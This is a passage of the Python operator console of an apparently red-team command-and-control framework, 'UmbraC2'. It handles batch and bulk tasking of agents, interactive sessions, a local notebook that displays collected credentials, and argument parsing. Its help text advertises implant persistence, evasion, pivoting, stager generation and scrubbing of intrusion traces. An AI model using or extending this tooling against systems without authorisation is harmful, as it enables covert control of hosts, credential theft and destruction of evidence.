                    print("usage: batch <plan-file> [key=value ...]")
                    return True
                try:
                    plan = load_plan(rest[0])
                    steps = plan_steps(plan)
                except PlanError as exc:
                    print(f"the plan is not usable: {exc}")
                    return True
                params, broken = split_params(rest[1:])
                if broken:
                    print("the parameters must be key=value: " + ", ".join(broken))
                    return True
                outcome = run_plan(self.client, self, steps, params)
                for entry in outcome["steps"]:
                    mark = "ok " if entry.get("ok") else "!! "
                    detail = entry.get("detail") or entry.get("err") or ""
                    print(f"{mark}{entry.get('index')} {entry.get('kind')} {detail}")
                if outcome.get("report"):
                    print()
                    print(outcome["report"])
            elif cmd == "workflow":
                if len(rest) < 1 or rest[0] == "list":
                    payload = self.client.workflow_list()
                    print(render_workflows(payload))
                    return True
                action = rest[0]
                if action == "add" and len(rest) > 2:
                    plan = load_plan(rest[2])
                    self.client.workflow_add(rest[1], plan_steps(plan),
                                             description=str(plan.get("description", "")),
                                             params=plan_params(plan))
                    print(f"workflow {rest[1]} written")
                    return True
                if action == "rm" and len(rest) > 1:
                    self.client.workflow_remove(rest[1])
                    print(f"workflow {rest[1]} removed")
                    return True
                if action == "run" and len(rest) > 1:
                    params, broken = split_params(rest[2:])
                    if broken:
                        print("the parameters must be key=value: " + ", ".join(broken))
                        return True
                    data = self.client.workflow_run(rest[1], params)
                    print(f"workflow {rest[1]} started as {data.get('run_id', '')}")
                    return True
                if action == "status" and len(rest) > 1:
                    payload = self.client.workflow_status(rest[1])
                    run = payload.get("run") or {}
                    print(f"run {run.get('id', '')}: {run.get('state', '')}")
                    for step in run.get("steps") or []:
                        mark = "ok " if step.get("ok") else "!! "
                        print(f"  {mark}{step.get('index')} {step.get('kind')} "
                              f"{step.get('detail', '')}")
                    return True
                print("usage: workflow list | add <name> <file> | rm <name> | "
                      "run <name> [k=v ...] | status <run-id>")
                return True
            elif cmd == "bulk":
                # One task, many agents, from the prompt of the console.
                if len(rest) < 2:
                    print("usage: bulk <kind> <filter> [k=v ...]")
                    return True
                kind = rest[0]
                filters = parse_filter(rest[1])
                args, broken = split_params(rest[2:])
                if broken:
                    print("the arguments must be key=value: " + ", ".join(broken))
                    return True
                rows = self.client.submit_bulk(kind, args, **filters)
                results = run_bulk(self.client, self, kind, args, rows)
                print(render_bulk_table(results))
                return True
            else:
                print(f"unknown command {cmd!r} (try `help`)")
        except OperatorError as exc:
            print(f"error: {exc}")
        except json.JSONDecodeError as exc:
            print(f"invalid json: {exc}")
        except (ValueError, IndexError) as exc:
            print(f"invalid arguments: {exc}")
        return True

    def _submit_and_maybe_wait(self, kind: str, args: Dict[str, Any], *, watch: bool) -> None:
        agent = self._resolve(None)
        task_id = self.client.submit(agent, kind, args)
        self.note_task(task_id, agent, kind, args)
        print(f"queued {task_id} for {agent} ({kind})")
        if watch or self.watch:
            try:
                task = self.client.wait_for_result(task_id, timeout=120)
            except OperatorError as exc:
                print(f"error: {exc}")
                return
            self.note_result(task_id, task)
            print_task_result(task)
        else:
            print("use `result <task-id>` to collect the output")


def _progress_printer() -> Any:
    """Return a `(done, total, final=False)` callback that redraws one stderr line."""
    state = {"last": -1.0}

    def show(done: int, total: int, *, final: bool = False) -> None:
        pct = (done / total * 100.0) if total > 0 else 0.0
        if not final and pct - state["last"] < 1.0:
            return
        state["last"] = pct
        total_txt = f"{total}" if total > 0 else "?"
        end = "\n" if final else "\r"
        print(f"  {done}/{total_txt} bytes ({pct:5.1f}%)", file=sys.stderr, end=end, flush=True)

    return show


def print_help() -> None:
    print(
        """commands:
  help                      show this help
  agents | ls [filter]      list agents (state=online, tag=dc, ...)
  tag <agent> <label>       label an agent
  session [cmd]            open an interactive session
  chain <agent> k:{...}    queue a multi-stage task
  triage <path>            triage a file on the agent
  find <name>              search for files on the agent
  netinfo                  the network configuration of the agent
  scan <target> [ports=…]  scan a range of hosts for open ports
  resolve <host>           where a name points at
  env [filter=…]           the environment of the agent
  touch <path>             create a file on the agent and stamp it
  artifact [list|put|get|remove]  the team server's file store
  panic [agent-id]         tell the beacons to exit (asks twice)
  alerts                   the alert rules of the server
  policy <agent> sleep=60   push the beacon cadence
  whoami | me               your identity, role and allowed commands
  operators                 list connected operator consoles
  chat [@op] [message]      send (or read) operator chat
  focus [agent-id]          tell the team which agent you are on
  claim <task-id>           take ownership of a task
  release <task-id>         drop your claim
  schedule [list|add|rm]    recurring tasks
  use <agent-id>            select the current agent
  info [agent-id]           full agent record
  run <command>             queue a shell task and print its result
  exec <kind> [json]        queue arbitrary task (sysinfo, ls, download, ...)
  get <remote> <local>      pull a file from the current agent
  put <local> <remote>      push a file to the current agent
  download <agent> <remote> <local>   pull a file (chunked, verified)
  upload <agent> <local> <remote>     push a file (chunked, verified)
  tasks [limit]             recent tasks for the current agent
  result <task-id>          print a task result
  cancel <task-id>          cancel a queued task
  retry <task-id>           run a finished task again
  persist [method]          install the implant so it survives a reboot
  persist-list              what is installed on an agent
  persist-verify            check that the entries are still there
  persist-migrate           move from one technique to another
  persist-health            the persistence verdict of an agent
  persist-report            the persistence of the whole fleet
  evade-report              the posture of an agent or of the fleet
  evade-posture             how the environment changes the behaviour
  evade-profile             the schedule the beacon sleeps by
  evade-shape               the shape of the traffic
  evade-killswitch          the moment the implant stops existing
  hygiene                   the memory and the process hygiene
  update <path>             replace the running implant
  browse [path]             list the files under a path
  report [agent]            write a report about an agent
  sessions                  the interactive sessions that are open
  survey <agent>            what the engagement left on a host
  forensics <agent>         the surface of a host, as an analyst sees it
  scrub <agent> [family…]   remove the traces of a host (state, history, ...)
  verify <agent>            what is left on a host after the wipe
  journal <agent>           the timeline of the engagement on a host
  vanish <agent>            the implant leaves the host (asks twice)
  decommission <agent>      the end of the engagement on a host (asks twice)
  clean                     the traces of the engagement on this machine
  deadman <agent>           the dead man's switch of a host
  cleanup                   wipe the traces of many hosts at once
  wipe                      clear the record of the engagement (asks twice)
  events [limit]            the recent events of the server's journal
  watch [on|off]            toggle automatic result printing
  sleep <secs> [jitter%]    change the beacon interval
  kill [agent-id]           tell an agent to exit
  audit [limit]             recent operator actions (audit trail)
  audit --verify            check the chain of the ledger of the server
  stats                     server statistics
  rpc <cmd> [json]          send one raw command to the server
  batch <plan-file> [k=v]   run a plan file, step by step
  workflow list|add|rm|run|status   the named sequences of steps
  bulk <kind> <filter>      one task on many agents, with a cap
  inbox                     the tasks that were handed to you
  assign <task-id> <op>     hand a task to a colleague
  handover                  the handover document of the engagement
  pivot [list|open|close|claims|release]
                          pivot through an agent (socks5 / port forward)
  vpn [status|peers|alloc|routes|route|ping]  the layer-3 tunnel
  armory [list|search|needs|versions|resolve|import|inst|rm|run] the extension store
  alias [list|run]          saved commands
  team-sync                 one snapshot of the team
  migrate <agent>           move the work of an agent into another process
  recon <agent>             run a reconnaissance profile on an agent
  domain-map <agent>        the paths from the identity of an agent to a target
  suggest <agent>           what could be tried next, given the findings
  stager [options]          render a stager script
  db [action] [value]       the local notebook (stats|tasks|results|notes|search|note)
  raw <cmd> [json]          send a raw RPC
  hunt [list|add|remove|sweep]  the indicators of the team, and the hunt
  health                        the score of the hosts of the engagement
  case [list|show|create|add|close]  the evidence files of the engagement
  approval [list|show|request|approve|deny]  the two-person rule
  canary [list|show|plant|check|remove]  the tripwires of the engagement
  dossier [list|show]         the file of a host: what the server knows
  otp [status|rotate|remove|code]  the second factor of the operator
  note [list|add|show|remove]   the notes the team writes about hosts
  quit                      disconnect and exit"""
    )


def wait_for_session_id(client: OperatorClient, task_id: str, timeout: float) -> str:
    """Wait for the id of an open session.

    The id travels with the first output chunk, so the operator can address
    the session before it produced anything.
    """
    deadline = time.time() + timeout
    while time.time() < deadline:
        event = client.next_event(timeout=1.0)
        if event is None:
            continue
        if event.get("kind") == "task.output" and event.get("task_id") == task_id:
            data = event.get("data") or {}
            meta = data.get("meta") or {}
            if meta.get("session"):
                return str(meta["session"])
    return ""


def stream_session(client: OperatorClient, console: Console, agent_id: str,
                   task_id: str, timeout: float) -> None:
    """Type into a session and print what comes back.

    The output arrives as `task.output` events, so a reader thread prints it
    while the main thread reads the operator's input.
    """
    state = {"session": "", "stop": False}
    pending: List[str] = []
    lock = threading.Lock()

    def send(line: str) -> None:
        try:
            client.session_input(agent_id, state["session"], line.encode())
        except OperatorError as exc:
            print(f"session write failed: {exc}", file=sys.stderr)

    def pump() -> None:
        deadline = time.time() + timeout
        while not state["stop"] and time.time() < deadline:
            event = client.next_event(timeout=0.5)
            if event is None:
                continue
            kind = event.get("kind", "")
            if kind == "task.output" and event.get("task_id") == task_id:
                data = event.get("data") or {}
                meta = data.get("meta") or {}
                if not state["session"] and meta.get("session"):
                    state["session"] = str(meta["session"])
                    # The lines that were typed before the session was ready
                    # go out now.
                    with lock:
                        waiting = list(pending)
                        pending.clear()
                    for line in waiting:
                        send(line)
                text = data.get("output")
                if text:
                    sys.stdout.write(text)
                    sys.stdout.flush()
            elif kind == "task.result" and event.get("task_id") == task_id:
                break

    worker = threading.Thread(target=pump, daemon=True)
    worker.start()
    try:
        for line in sys.stdin:
            with lock:
                ready = bool(state["session"])
                if not ready:
                    pending.append(line)
            if ready:
                send(line)
    except KeyboardInterrupt:
        pass
    finally:
        state["stop"] = True
        worker.join(timeout=2.0)
    if state["session"]:
        try:
            client.close_session(agent_id, state["session"])
        except OperatorError:
            pass


def parse_filter(text: str) -> Dict[str, str]:
    """Parse a filter string ("state=online,tag=dc") into a dictionary.

    The console speaks the same filter language as the server, so an operator
    can write the selection once and use it for finding agents and for acting
    on them.
    """
    out: Dict[str, str] = {}
    for part in (text or "").split(","):
        part = part.strip()
        if not part:
            continue
        key, _, value = part.partition("=")
        key, value = key.strip(), value.strip()
        if key and value:
            out[key] = value
    return out


# ---------------------------------------------------------------------------
# local state database
# ---------------------------------------------------------------------------
def open_state(path: str) -> Optional[db.StateStore]:
    """Open the local notebook.

    A missing or broken database must never stop the console: the server
    holds the authoritative state, the notebook is a convenience.
    """
    if not path:
        return None
    try:
        return db.StateStore(path).open()
    except db.StateError as exc:
        print(f"local state unavailable: {exc}", file=sys.stderr)
        return None


def print_db_tasks(rows: List[Dict[str, Any]]) -> None:
    if not rows:
        print("no tasks recorded")
        return
    print(table(
        ["task", "agent", "kind", "state", "when"],
        [[r.get("task_id", ""), r.get("agent", ""), r.get("kind", ""),
          r.get("state", ""), fmt_ts(r.get("submitted", 0))] for r in rows]))


def print_db_results(rows: List[Dict[str, Any]]) -> None:
    if not rows:
        print("no results recorded")
        return
    print(table(
        ["task", "code", "when", "output"],
        [[r.get("task_id", ""), str(r.get("code", 0)), fmt_ts(r.get("finished", 0)),
          short(decode_out(r.get("output") or b""), 48)] for r in rows]))


def print_db_notes(rows: List[Dict[str, Any]]) -> None:
    if not rows:
        print("no notes")
        return
    print(table(
        ["when", "agent", "note"],
        [[fmt_ts(r.get("created", 0)), r.get("agent", ""), short(r.get("body", ""), 60)]
         for r in rows]))


def print_db_search(rows: List[Dict[str, Any]]) -> None:
    if not rows:
        print("nothing matched")
        return
    for row in rows:
        stamp = fmt_ts(row.get("at", 0))
        where = row.get("where", "?")
        if where == "task":
            print(f"[{stamp}] task {row['task_id']} on {row.get('agent') or '-'} "
                  f"({row.get('kind', '')})")
        elif where == "note":
            print(f"[{stamp}] note on {row.get('agent') or '-'}: {row.get('body', '')}")
        else:
            print(f"[{stamp}] result {row.get('task_id', '')} "
                  f"(code {row.get('code', 0)}): {row.get('excerpt', '')}")


def print_queue(payload: Dict[str, Any]) -> None:
    """Render the state of the queue."""
    print("the policy")
    print(f"  in flight per agent : {payload.get('max_in_flight_per_agent', '?')}")
    print(f"  per minute per agent: {payload.get('max_deliver_per_minute_per_agent', '?')}")
    print(f"  per second          : {payload.get('max_deliver_per_second', '?')}")
    print(f"  attempts before dead: {payload.get('max_attempts', '?')}")
    print(f"  breaker after       : {payload.get('breaker_threshold', '?')} failures")
    print("")
    dead = payload.get("dead_letter") or []
    if not dead:
        print("the dead letter queue is empty")
        return
    print("the dead letter queue")
    print(table(["TASK", "AGENT", "KIND", "ATTEMPTS", "TRACE", "REASON"],
                [[str(row.get("task_id", "")), str(row.get("agent_id", "")),
                  str(row.get("kind", "")), str(row.get("attempts", "")),
                  str(row.get("trace_id", "")), str(row.get("err", ""))[:40]]
                 for row in dead]))


def print_tokens(rows: List[Dict[str, Any]]) -> None:
    """Render the operator tokens: who has one, what it may do, until when."""
    if not rows:
        print("there is no operator token")
        return
    table_rows = []
    for row in rows:
        expires = int(row.get("expires", 0) or 0)
        when = time.strftime("%Y-%m-%d %H:%M", time.localtime(expires)) if expires else "never"
        last = int(row.get("last_used", 0) or 0)
        seen = time.strftime("%Y-%m-%d %H:%M", time.localtime(last)) if last else "never"
        scopes = ",".join(row.get("scopes") or []) or "the role decides"
        state = "expired" if row.get("expired") else row.get("role", "")
        table_rows.append([str(row.get("operator", "")), state, scopes, when, seen])
    print(table(["OPERATOR", "STATE", "SCOPES", "EXPIRES", "LAST USED"], table_rows))


def print_db_findings(rows: List[Dict[str, Any]]) -> None:
    """Render the findings of the notebook."""
    if not rows:
        print("_no finding was recorded_")
        return
    print(table(["WHEN", "AGENT", "SEVERITY", "KIND", "FINDING", "DETAIL"],
                [[str(r.get("created", "")), str(r.get("agent", "")),
                  str(r.get("severity", "")), str(r.get("kind", "")),
                  str(r.get("name", "")), str(r.get("detail", ""))[:60]]
                 for r in rows]))


def print_db_artifacts(rows: List[Dict[str, Any]]) -> None:
    """Render the artefacts of the notebook."""
    if not rows:
        print("_no artefact was kept_")
        return
    print(table(["WHEN", "AGENT", "NAME", "SIZE", "DIGEST"],
                [[str(r.get("created", "")), str(r.get("agent", "")),
                  str(r.get("name", "")), str(r.get("size", "")),
                  str(r.get("digest", ""))[:16]] for r in rows]))


def print_db_screenshots(rows: List[Dict[str, Any]]) -> None:
    """Render the screenshots of the notebook."""
    if not rows:
        print("_no screenshot was taken_")
        return
    print(table(["WHEN", "AGENT", "PATH", "SIZE"],
                [[str(r.get("created", "")), str(r.get("agent", "")),
                  str(r.get("path", "")), str(r.get("size", ""))] for r in rows]))


def print_db_credentials(rows: List[Dict[str, Any]]) -> None:
    """Render the material of the notebook."""
    if not rows:
        print("_no material was collected_")
        return
    print(table(["WHEN", "AGENT", "KIND", "ACCOUNT", "TARGET", "VALUE"],
                [[str(r.get("created", "")), str(r.get("agent", "")),
                  str(r.get("kind", "")), str(r.get("account", "")),
                  str(r.get("target", "")), str(r.get("secret", ""))]
                 for r in rows]))


def run_db_command(args: argparse.Namespace) -> int:
    """`umbra db ...` -- the local notebook; it needs no server connection."""
    store = open_state(args.db)
    if store is None:
        return 2
    try:
        if args.action == "stats":
            stats = store.stats()
            if args.json:
                print(json.dumps(stats, indent=2, sort_keys=True, default=json_default))
            else:
                print(f"database : {stats['path']}")
                print(f"sessions : {stats['sessions']}")
                print(f"tasks    : {stats['tasks']}")
                print(f"results  : {stats['results']}")
                print(f"notes    : {stats['notes']}")
                print(f"agents   : {stats['agents']}")
                for kind in stats["kinds"]:
                    print(f"  {kind['kind']:<12} {kind['count']}")
        elif args.action == "tasks":
            rows = store.tasks(args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_tasks(rows)
        elif args.action == "results":
            rows = store.results(args.value, args.limit)
            if args.json:
                print(json.dumps(
                    [{**r, "output": decode_out(r.get("output"))} for r in rows],
                    indent=2, sort_keys=True, default=json_default))
            else:
                print_db_results(rows)
        elif args.action == "notes":
            rows = store.notes(args.agent or args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_notes(rows)
        elif args.action == "search":
            rows = store.search(args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_search(rows)
        elif args.action == "note":
            body = args.value or args.agent
            if not body.strip():
                print("usage: umbra db note \"what I found\"", file=sys.stderr)
                return 2
            note_id = store.add_note(body, args.agent)
            if args.json:
                print(json.dumps({"note_id": note_id, "agent": args.agent},
                                 indent=2, sort_keys=True))
            else:
                print(f"note {note_id} recorded")
        elif args.action == "findings":
            rows = store.findings(args.agent or args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_findings(rows)
        elif args.action == "artifacts":
            rows = store.artifacts(args.agent or args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_artifacts(rows)
        elif args.action == "screenshots":
            rows = store.screenshots(args.agent or args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_screenshots(rows)
        elif args.action == "creds":
            rows = store.credentials(args.agent or args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_credentials(rows)
        else:  # export
            target = args.out or "umbra-state.json"
            path = store.export(target)
            if args.json:
                print(json.dumps({"exported": path}, indent=2, sort_keys=True))
            else:
                print(f"exported to {path}")
    except db.StateError as exc:
        print(f"local state error: {exc}", file=sys.stderr)
        return 1
    finally:
        store.close()
    return 0


# ---------------------------------------------------------------------------
# argument parsing
# ---------------------------------------------------------------------------
def read_token(args: argparse.Namespace) -> str:
    if args.token:
        return args.token
    if args.token_file:
        try:
            with open(args.token_file, "r", encoding="utf-8") as fh:
                return fh.read().strip()
        except OSError as exc:
            raise SystemExit(f"cannot read token file: {exc}")
    env = os.environ.get("UMBRA_OPERATOR_TOKEN", "")
    if env:
        return env
    if sys.stdin.isatty():
        return getpass.getpass("operator token: ").strip()
    raise SystemExit("no operator token (use --token, --token-file or $UMBRA_OPERATOR_TOKEN)")


def read_secret(value: str, path: str) -> str:
    """Read a secret from a value or from a file.

    A secret that is typed on the command line is a secret that is in the
    process list of every other program on the machine.  The file is the
    better way, and it is the one this helper prefers.
    """
    if path:
        try:
            with open(path, "r", encoding="utf-8") as fh:
                return fh.read().strip()
        except OSError as exc:
            raise SystemExit(f"cannot read secret file: {exc}")
    return (value or "").strip()


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="umbra",
        description="UmbraC2 operator console (umbra/v1)",
        epilog="This tool is for authorised security testing only.",
        # No abbreviations: `--to` must not be guessed as `--token`, and an
        # ambiguous prefix should fail instead of silently picking one.
        allow_abbrev=False,
    )
    p.add_argument("--server", "-s", default=os.environ.get("UMBRA_SERVER", "127.0.0.1:4002"),
                   help="team server operator listener (default 127.0.0.1:4002)")
    p.add_argument("--operator", "-o", default=os.environ.get("UMBRA_OPERATOR", "operator"),
                   help="operator identity (must match a server token entry)")
    p.add_argument("--token", "-k", default=None, help="operator token (prefer --token-file or env)")
    p.add_argument("--token-file", default=None, help="file containing the operator token")
    p.add_argument("--timeout", type=float, default=15.0, help="socket/RPC timeout in seconds")
    p.add_argument("--tls", action="store_true",
                   help="wrap the operator connection in TLS (the server needs tls_listen)")
    p.add_argument("--tls-ca", default=os.environ.get("UMBRA_TLS_CA", ""),
                   help="PEM file with the certificate authority that signed the server certificate")
    p.add_argument("--tls-server-name", default=os.environ.get("UMBRA_TLS_SERVER_NAME", ""),
                   help="name the server certificate has to carry (SNI and verification)")
    p.add_argument("--tls-cert", default=os.environ.get("UMBRA_TLS_CERT", ""),
                   help="client certificate for a server that asks for one (mTLS)")
    p.add_argument("--tls-key", default=os.environ.get("UMBRA_TLS_KEY", ""),
                   help="private key of the client certificate")
    p.add_argument("--tls-pin", default=os.environ.get("UMBRA_TLS_PIN", ""),
                   help="pinned public key of the server (hex SHA-256 of its "
                        "SubjectPublicKeyInfo); the server is trusted only "
                        "when it holds that key")
    p.add_argument("--otp", default=os.environ.get("UMBRA_OTP", ""),
                   help="the code of the second factor, when the operator "
                        "has one (the server refuses the console without it)")
    p.add_argument("--watch", action="store_true", help="print events as they arrive")
    p.add_argument("--quiet", action="store_true", help="do not print the event banner")
    p.add_argument("--db", default=os.environ.get(
        "UMBRA_DB", os.path.join(os.path.expanduser("~"), ".umbra", "state.db")),
        help="local state database (SQLite); empty disables the notebook")
    p.add_argument("--json", action="store_true",
                   help="machine-readable output for agents/tasks/info/stats/result")
    p.add_argument("--version", action="version", version=f"umbra {__version__} ({wire.SUITE_NAMES[1]}, umbra/v1)")

    sub = p.add_subparsers(dest="cmd")

    agents_cmd = sub.add_parser("agents", help="list agents")
    agents_cmd.add_argument("--state", default="", help="filter: online or offline")
    agents_cmd.add_argument("--transport", default="", help="filter: tcp, http, ws, dns")
    agents_cmd.add_argument("--os", default="", help="filter: the operating system")
    agents_cmd.add_argument("--arch", default="", help="filter: the architecture")
    agents_cmd.add_argument("--tag", default="", help="filter: agents carrying this tag")
    agents_cmd.add_argument("--user", default="", help="filter: the account the beacon runs as")
    sub.add_parser("operators", help="list connected operator consoles")
    sub.add_parser("whoami", help="your operator identity, role and capabilities")

    chat = sub.add_parser("chat", help="operator chat")
    chat.add_argument("message", nargs="*", help="send a message (omit to read history)")
    chat.add_argument("--limit", type=int, default=20)
    chat.add_argument("--to", default="", help="address one operator instead of the team")
    chat.add_argument("--operators", action="store_true",
                      help="who is in the channel instead of the history")

    focus = sub.add_parser("focus", help="announce the agent you are working on")
    focus.add_argument("agent", nargs="?", default="", help="agent id (omit to clear)")

    claim = sub.add_parser("claim", help="take ownership of a task")
    claim.add_argument("task_id")

    assign = sub.add_parser("assign", help="hand a task to a colleague")
    assign.add_argument("task_id")
    assign.add_argument("to", nargs="?", default="",
                        help="the operator (omit to take the assignment back)")

    inbox = sub.add_parser("inbox", help="the tasks that were handed to you")
    inbox.add_argument("--operator", default="",
                       help="the inbox of another operator")
    inbox.add_argument("--limit", type=int, default=50)

    handover = sub.add_parser("handover", help="the handover document of the engagement")
    handover.add_argument("--out", default="",
                          help="write the document to a file instead of the screen")

    release = sub.add_parser("release", help="drop your claim on a task")
    release.add_argument("task_id")

    sched = sub.add_parser("schedule", help="recurring tasks")
    sched.add_argument("action", choices=["list", "add", "rm"])
    sched.add_argument("target", nargs="?", help="agent id (add) or schedule id (rm)")
    sched.add_argument("kind", nargs="?", help="task kind for add")
    sched.add_argument("--every", type=int, default=300, help="interval in seconds (min 5)")
    sched.add_argument("--args", default="{}", help="task arguments as JSON (add)")
    sub.add_parser("stats", help="server statistics")

    test_event = sub.add_parser("test-event",
                                 help="put one event of your own into the journal")
    test_event.add_argument("--kind", default="test.ping", help="the kind of the event")

    quiet = sub.add_parser("quiet", help="stop the traffic of the server (a window)")
    quiet.add_argument("state", choices=["on", "off"], help="on or off")
    quiet.add_argument("--until", type=int, default=0,
                       help="the unix time the window ends by itself")

    queue = sub.add_parser("queue", help="the state of the queue")
    queue.add_argument("--dead", action="store_true",
                       help="show only the dead letter queue")

    keys = sub.add_parser("keys", help="the credentials of the server")
    keys_sub = keys.add_subparsers(dest="keys_cmd")
    keys_rotate = keys_sub.add_parser("rotate", help="replace the key of the beacons")
    keys_rotate.add_argument("--target", default="agent",
                             help="what to rotate (agent)")
    keys_rotate.add_argument("--psk", default="",
                             dest="rotate_psk",
                             help="use this key instead of a generated one")
    keys_rotate.add_argument("--psk-file", default="",
                             dest="rotate_psk_file",
                             help="read the key from a file (keeps it out of argv)")

    tokens = sub.add_parser("tokens", help="the operator tokens")
    tokens_sub = tokens.add_subparsers(dest="tokens_cmd")
    tokens_sub.add_parser("list", help="the tokens and their state")
    token_rotate = tokens_sub.add_parser("rotate", help="replace the token of an operator")
    token_rotate.add_argument("operator", help="the identity of the operator")
    token_rotate.add_argument("--role", default="", help="admin, operator or viewer")
    token_rotate.add_argument("--scope", action="append", default=[],
                              help="a command the token may call (repeatable)")
    token_rotate.add_argument("--expires", type=int, default=0,
                              help="the unix time the token expires")
    token_rotate.add_argument("--token", default="",
                              dest="rotate_token",
                              help="the token itself (generated when empty)")
    token_rotate.add_argument("--token-file", default="",
                              dest="rotate_token_file",
                              help="read the token from a file (keeps it out of argv)")

    priority = sub.add_parser("priority", help="say how urgent a task is")
    priority.add_argument("task_id")
    priority.add_argument("priority", type=int, help="the priority: higher goes first")

    audit_cmd = sub.add_parser("audit", help="recent operator actions (audit trail)")
    audit_cmd.add_argument("--limit", type=int, default=50)
    audit_cmd.add_argument("--verify", action="store_true",
                           help="check the chain of the ledger: a line that "
                                "was edited after the fact breaks it")

    # ---- the hunt: the indicators of the team -------------------------
    hunt_cmd = sub.add_parser("hunt",
                              help="the indicators of the team, and the hunt "
                                   "that looks for them")
    hunt_sub = hunt_cmd.add_subparsers(dest="hunt_cmd")

    hunt_list = hunt_sub.add_parser("list", help="the catalogue of the indicators")
    hunt_list.add_argument("--query", default="",
                            help="search the value, the label, the note and "
                                 "the source")
    hunt_list.add_argument("--kind", default="",
                            help="only this kind of indicator")

    hunt_add = hunt_sub.add_parser("add", help="put an indicator into the catalogue")
    hunt_add.add_argument("--kind", default="",
                          help="hash, path, mutex, registry, certificate, "
                               "process or service")
    hunt_add.add_argument("--value", default="", help="the indicator itself")
    hunt_add.add_argument("--label", default="", help="what the team calls it")
    hunt_add.add_argument("--note", default="", help="where it came from")
    hunt_add.add_argument("--source", default="", help="the ticket or the report")

    hunt_remove = hunt_sub.add_parser("remove", help="take an indicator out")
    hunt_remove.add_argument("id", help="the id of the indicator")

    hunt_sweep = hunt_sub.add_parser("sweep", help="ask the hosts what they carry")
    hunt_sweep.add_argument("--agent", default="", help="one host")
    hunt_sweep.add_argument("--all", action="store_true", help="every host")
    hunt_sweep.add_argument("--filter", default="",
                            help="the hosts to hunt: state=online, tag=dc, ...")
    hunt_sweep.add_argument("--roots", default="",
                            help="the directories the hunt may walk")
    hunt_sweep.add_argument("--wait", action="store_true",
                            help="wait for and print the answer of the hunt")

    # ---- the health of the fleet ---------------------------------------
    health_cmd = sub.add_parser("health",
                                help="the score of the hosts of the engagement")
    health_cmd.add_argument("--json", action="store_true",
                             help="machine-readable output")

    # ---- the evidence files ---------------------------------------------
    case_cmd = sub.add_parser("case", help="the evidence files of the engagement")
    case_sub = case_cmd.add_subparsers(dest="case_cmd")

    case_list = case_sub.add_parser("list", help="the cases, newest first")
    case_list.add_argument("--json", action="store_true")

    case_show = case_sub.add_parser("show", help="one case and its chain of custody")
    case_show.add_argument("id")
    case_show.add_argument("--json", action="store_true")

    case_create = case_sub.add_parser("create", help="open a case")
    case_create.add_argument("title")
    case_create.add_argument("--notes", default="")

    case_add = case_sub.add_parser("add", help="put a piece of evidence into a case")
    case_add.add_argument("id", help="the case")
    case_add.add_argument("--kind", default="evidence", help="what it is")
    case_add.add_argument("--ref", default="", help="where the bytes are")
    case_add.add_argument("--sha256", default="", help="the hash of the bytes")
    case_add.add_argument("--agent", default="", help="the host it was taken from")
    case_add.add_argument("--task", default="", help="the task that took it")
    case_add.add_argument("--note", default="")

    case_close = case_sub.add_parser("close", help="close a case")
    case_close.add_argument("id")
    case_close.add_argument("--note", default="")

    # ---- the two-person rule -------------------------------------------
    approval_cmd = sub.add_parser("approval",
                                   help="the requests that wait for a "
                                        "second pair of eyes")
    approval_sub = approval_cmd.add_subparsers(dest="approval_cmd")

    approval_list = approval_sub.add_parser("list", help="the queue of the team")
    approval_list.add_argument("--state", default="",
                               help="only this state: pending, approved, "
                                    "denied or expired")
    approval_list.add_argument("--json", action="store_true")

    approval_show = approval_sub.add_parser("show", help="one request")
    approval_show.add_argument("id")
    approval_show.add_argument("--json", action="store_true")

    approval_request = approval_sub.add_parser(
        "request", help="ask for an operation that needs a second pair of eyes")
    approval_request.add_argument("kind", help="the kind of the operation")
    approval_request.add_argument("--agent", default="", help="the host")
    approval_request.add_argument("--reason", default="",
                                  help="why the operation is wanted")
    approval_request.add_argument("--json", action="store_true")

    approval_approve = approval_sub.add_parser("approve", help="say yes")
    approval_approve.add_argument("id")
    approval_approve.add_argument("--note", default="")
    approval_approve.add_argument("--json", action="store_true")

    approval_deny = approval_sub.add_parser("deny", help="say no")
    approval_deny.add_argument("id")
    approval_deny.add_argument("--note", default="")
    approval_deny.add_argument("--json", action="store_true")

    # ---- the tripwires --------------------------------------------------
    canary_cmd = sub.add_parser("canary", help="the tripwires of the engagement")
    canary_sub = canary_cmd.add_subparsers(dest="canary_cmd")

    canary_list = canary_sub.add_parser("list", help="the tripwires")
    canary_list.add_argument("--agent", default="", help="one host")
    canary_list.add_argument("--json", action="store_true")

    canary_show = canary_sub.add_parser("show", help="one tripwire")
    canary_show.add_argument("id")
    canary_show.add_argument("--json", action="store_true")

    canary_plant = canary_sub.add_parser("plant", help="plant a tripwire")
    canary_plant.add_argument("--agent", required=True, help="the host")
    canary_plant.add_argument("--label", required=True,
                               help="what the tripwire is for")
    canary_plant.add_argument("--note", default="")
    canary_plant.add_argument("--json", action="store_true")

    canary_check = canary_sub.add_parser("check",
                                          help="ask the hosts about their tripwires")
    canary_check.add_argument("--agent", default="", help="one host")
    canary_check.add_argument("--all", action="store_true", help="every host")
    canary_check.add_argument("--filter", default="",
                              help="the hosts to ask: state=online, tag=dc, ...")
    canary_check.add_argument("--wait", action="store_true",
                              help="wait for and print the answer")
    canary_check.add_argument("--json", action="store_true")

    canary_remove = canary_sub.add_parser("remove",
                                           help="stop watching a tripwire")
    canary_remove.add_argument("id")
    canary_remove.add_argument("--json", action="store_true")

    # ---- the baseline of a host ------------------------------------------
    baseline_cmd = sub.add_parser("baseline",
                                  help="the paths the team watches on the hosts")
    baseline_sub = baseline_cmd.add_subparsers(dest="baseline_cmd")

    baseline_list = baseline_sub.add_parser("list",
                                             help="the watched paths")
    baseline_list.add_argument("--agent", default="", help="one host")
    baseline_list.add_argument("--state", default="",
                               help="only one state: unknown/present/changed/...")
    baseline_list.add_argument("--json", action="store_true")

    baseline_add = baseline_sub.add_parser("add", help="watch a path")
